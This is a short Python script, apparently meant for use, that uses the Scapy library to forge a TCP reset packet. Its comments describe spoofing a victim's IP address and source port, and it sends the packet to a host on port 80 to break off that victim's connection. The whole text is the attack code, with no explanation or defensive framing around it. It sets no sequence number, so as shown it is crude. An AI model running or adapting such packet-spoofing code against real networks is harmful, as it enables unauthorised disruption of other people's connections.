from scapy.all import *

srcip = '192.168.0.118' #IP Address to spoof
dstip = '192.168.0.1' #Destination IP

srcport = 12345 #Random spoofed  source port of victim
dstport = 80 #Destination port

spoof_rst = IP(src=srcip, dst=dstip) / TCP(flags="R", sport=srcport, dport=dstport)
send(spoof_rst)
